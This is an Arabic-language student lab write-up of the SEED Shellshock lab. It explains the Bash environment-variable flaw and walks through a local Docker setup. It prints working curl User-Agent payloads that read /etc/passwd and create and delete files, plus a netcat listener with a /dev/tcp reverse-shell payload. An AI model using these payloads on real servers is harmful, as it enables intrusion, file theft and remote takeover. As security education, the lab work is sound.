# Shellshock Attack Lab Guide

هذا الملف يوضح الفكرة العامة لثغرة **Shellshock** وكيفية إعداد بيئة العمل (Lab Setup) للقيام بالتجارب.

## 1. الفكرة العامة لثغرة Shellshock (Overview)

ثغرة Shellshock هي ثغرة أمنية تاريخية في برنامج **Bash** (مفسر الأوامر في أنظمة لينكس). تكمن المشكلة في أن النسخ القديمة من Bash تعالج متغيرات البيئة (Environment Variables) بطريقة خاطئة؛ حيث تقوم بتنفيذ الأوامر الموجودة بداخلها بدلاً من معاملتها كنصوص عادية.

### آلية الهجوم (How it works):
- **الهدف:** تنفيذ أوامر على السيرفر (Web Server) عن بُعد.
- **طريقة الحقن:** يتم إرسال الأوامر عبر طلبات HTTP (مثل تعديل الـ **User-Agent** في الـ HTTP Header).
- **الاستجابة:** خادم الويب (Apache) يحول هذه الـ Headers إلى متغيرات بيئة ويسلمها لبرنامج Bash لتشغيل سكربتات الـ CGI.
- **النتيجة:** يقوم الـ Bash المصاب بقراءة الأوامر الموجودة في متغير البيئة وتنفيذها فوراً بصلاحيات النظام.

## 2. خطوات إعداد بيئة العمل (Environment Setup)

   `10.9.0.80    www.seedlab-shellshock.com`
3. احفظي الملف (`Ctrl+O` ثم `Enter`) واخرجي (`Ctrl+X`).

### 2.2 تشغيل الحاويات (Docker Setup)

1. انتقلي إلى مجلد اللاب: `cd Labsetup`
2. لبناء الحاويات: `dcbuild`
3. لتشغيل الحاويات: `dcup`

### 2.3 التحقق من عمل السيرفر
للتأكد من أن كل شيء يعمل، استخدمي الأمر التالي في التيرمينال:
`curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

يجب أن يظهر لكِ الرد: **Hello World**.


# Task 1: Experimenting with Bash Function

في هذه المهمة، قمنا بالتحقق من وجود ثغرة Shellshock من خلال مقارنة سلوك نسخة Bash مصابة مقابل نسخة Bash محمية (Patched).

## خطوات التجربة:

1. **التحقق من النسخة المصابة (`bash_shellshock`):**
   - قمنا بتعريف متغير بيئة يحمل كوداً خبيثاً:
     ```bash
     export foo='() { :;}; echo VULNERABLE'
     ```
   - عند تنفيذ أمر عبر هذه النسخة:
     ```bash
     bash_shellshock -c "echo test"
     ```
   - **النتيجة:** تم طباعة `VULNERABLE` ثم `test`. هذا يثبت أن النسخة المصابة نفذت الأمر الخبيث الموجود داخل متغير البيئة.

2. **التحقق من النسخة السليمة (`/bin/bash`):**
   - استخدمنا نفس متغير البيئة السابق:
     ```bash
     export foo='() { :;}; echo VULNERABLE'
     ```
   - عند تنفيذ أمر عبر النسخة المحمية:
     ```bash
     /bin/bash -c "echo test"
     ```
   - **النتيجة:** تم طباعة `test` فقط. هذا يثبت أن النسخة المحمية لا تتأثر بالثغرة وتتجاهل الأوامر الخبيثة في متغيرات البيئة.

## الاستنتاج:
تثبت التجربة أن الإصدارات القديمة من Bash تعالج تعريفات الدوال في متغيرات البيئة بشكل غير آمن، مما يسمح للمهاجم بتنفيذ أوامر عشوائية، بينما الإصدارات الحديثة والمحمية تعالج هذه المدخلات بأمان.


# Task 2: Passing Data to Bash via Environment Variable

في هذه المهمة، قمنا باستكشاف كيفية تمرير البيانات من جهاز المهاجم إلى السيرفر عبر طلبات HTTP، وكيف تتحول هذه البيانات إلى متغيرات بيئة (Environment Variables) داخل السيرفر.

## خطوات التجربة:

استخدمنا أداة `curl` للتحكم في حقول الـ HTTP Header وإرسال بيانات مخصصة إلى السيرفر:

1. **اختبار خيار الـ User-Agent (`-A`):**
   - الأمر: `curl -A "my data" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi`
   - **النتيجة:** تم تحويل "my data" إلى متغير بيئة باسم `HTTP_USER_AGENT`.

2. **اختبار خيار الـ Referer (`-e`):**
   - الأمر: `curl -e "my data" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi`
   - **النتيجة:** تم تحويل "my data" إلى متغير بيئة باسم `HTTP_REFERER`.

3. **اختبار خيار الـ Custom Header (`-H`):**
   - الأمر: `curl -H "AAAAAA: BBBBBB" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi`
   - **النتيجة:** تم تحويل Header المخصص إلى متغير بيئة باسم `HTTP_AAAAAA`.

## الاستنتاج:
أثبتت التجربة أن العديد من حقول الـ HTTP Header يتم تحويلها تلقائياً إلى متغيرات بيئة من قبل خادم الويب (Apache) عند تشغيل سكربتات CGI. هذا يفتح الباب أمام المهاجم لاستغلال ثغرة Shellshock عن طريق حقن أوامر برمجية خبيثة داخل هذه الـ Headers، ليقوم الـ Bash المصاب بتنفيذها فور استقبال الطلب.


# Task 3: Launching the Shellshock Attack 

### 1. Task 3.A: Launching the Shellshock Attack

في هذه المهمة، قمنا باستغلال ثغرة Shellshock فعلياً لتنفيذ أوامر عن بُعد (Remote Command Execution) على السيرفر المستهدف.

## خطوات التجربة:

استخدمنا أداة `curl` للقيام بهجوم حقن الأوامر عبر تعديل حقل الـ `User-Agent` في الـ HTTP Header:

1. **كود الاستغلال (Payload):**
   - استخدمنا الأمر التالي:
     ```bash
     curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
     ```

2. **شرح الأمر:**
   - **`curl -A "..."`**: قمنا بحقن الكود داخل الـ User-Agent.
   - **`() { :;};`**: الدالة الوهمية التي تفعل الثغرة في Bash المصاب.
   - **`echo Content-Type: text/plain; echo;`**: إضافة الترويسة اللازمة لبروتوكول CGI لضمان عرض الناتج كـ plain text.
   - **`/bin/cat /etc/passwd`**: الأمر الذي تم تنفيذه على السيرفر لقراءة ملف الحسابات الحساس.

## النتيجة:
نجح الهجوم في جعل السيرفر ينفذ أمر القراءة `/bin/cat /etc/passwd` وإرسال محتويات الملف وعرضها على شاشتنا، مما يثبت إمكانية الوصول إلى ملفات النظام الحساسة عن بُعد.

## ملاحظة:
لقد قمنا بتعديل محتوى الـ `User-Agent` في الطلب المرسل من طرفنا، مما دفع السيرفر لتنفيذ هذا الأمر واسترجاع البيانات، دون التعديل على الملف نفسه الموجود على السيرفر.



في هذه المهام، قمنا بتنفيذ هجمات متقدمة باستخدام ثغرة Shellshock للتحكم في عمليات السيرفر والملفات.

## المهام المنفذة:

### 2. Task 3.B: الحصول على هوية المستخدم (User ID)
- **الأمر:** `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
- **النتيجة:** استرجعنا معلومات المستخدم الذي يشغل السيرفر، وتبين أنه `www-data` (uid=33).

### 3. Task 3.C: إنشاء ملف في مجلد `/tmp`
- **الأمر:** `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/touch /tmp/shellshock_test.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
- **التحقق:** استخدمنا الأمر `ls -l /tmp` من داخل الحاوية للتأكد من وجود الملف `shellshock_test.txt`.

### 4. Task 3.D: حذف الملف المنشأ
- **الأمر:** `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/rm /tmp/shellshock_test.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
- **التحقق:** استخدمنا الأمر `ls -l /tmp` للتأكد من اختفاء الملف، مما يثبت نجاح أمر الحذف.

## الاستنتاج:
تؤكد هذه التجارب قدرة المهاجم على تنفيذ أوامر برمجية متنوعة (قراءة صلاحيات، إنشاء ملفات، حذف ملفات) على النظام المستهدف بمجرد استغلال ثغرة Shellshock، مما يوضح التأثير الخطير لهذه الثغرة على أمن الأنظمة.


# Task 4: Getting a Reverse Shell via Shellshock

في هذه المهمة، تجاوزنا حدود تنفيذ الأوامر المنفردة وانتقلنا إلى مرحلة السيطرة الكاملة على النظام الضحية عبر تقنية "الصدفة العكسية" (Reverse Shell).

## خطوات التنفيذ:
1. **فتح منفذ استماع (Listener):** قمنا بتجهيز جهازنا لاستقبال الاتصال القادم من السيرفر باستخدام الأمر:
   `nc -l 9090`
   - هذا الأمر يفتح منفذ (Port) رقم 9090 وينتظر أي اتصال وارد.

2. **حقن أمر الـ Reverse Shell:** قمنا بإرسال أمر Shellshock الذي يجبر السيرفر على الاتصال بجهازنا:
   `curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`

---

## شرح الرموز التقنية (Redirection Operators):

المهندسة تهتم جداً بفهم كيفية دمج قنوات الإدخال والإخراج في Linux. إليكِ شرح الرموز التي استخدمناها:

- **`>&` (File Descriptor Redirection):**
  هذا الرمز يقوم بـ "توجيه" (Redirect) مخرج معين إلى وجهة أخرى. في حالتنا `/bin/bash -i >& /dev/tcp/...` يعني: خذ كل ما يخرج من الـ Bash (سواء كان مخرجاً طبيعياً Stdout أو رسائل خطأ Stderr) وأرسله مباشرة عبر قناة الشبكة المفتوحة إلى جهاز المهاجم.

- **`0>&1` (Standard Input to Standard Output):**
  - **`0`**: هو رقم "واصف الملف" (File Descriptor) لمدخلات النظام (Standard Input - حيث نكتب الأوامر).
  - **`1`**: هو رقم واصف الملف لمخرجات النظام (Standard Output - حيث تظهر النتائج).
  - **`0>&1`**: تعني حرفياً "اجعل قناة الإدخال الخاصة بي هي نفس قناة الإخراج". 
  - **الفكرة:** بما أننا قمنا بتحويل المخرجات (1) إلى الشبكة، فإننا بهذا الأمر نخبر النظام أن يأخذ الأوامر التي نكتبها (0) من نفس قناة الشبكة هذه، مما يجعلها دورة اتصال متكاملة (Interactive Shell).

---

## الاستنتاج:
بمجرد نجاح الاتصال، تحولت نافذة الـ Netcat إلى جلسة تفاعلية كاملة مع السيرفر، حيث استطعنا تنفيذ أوامر متعددة (مثل `id` و `ls`) مباشرة دون الحاجة لأي عمليات `curl` إضافية، مما يثبت نجاح السيطرة الكاملة (Full Remote Shell Access).
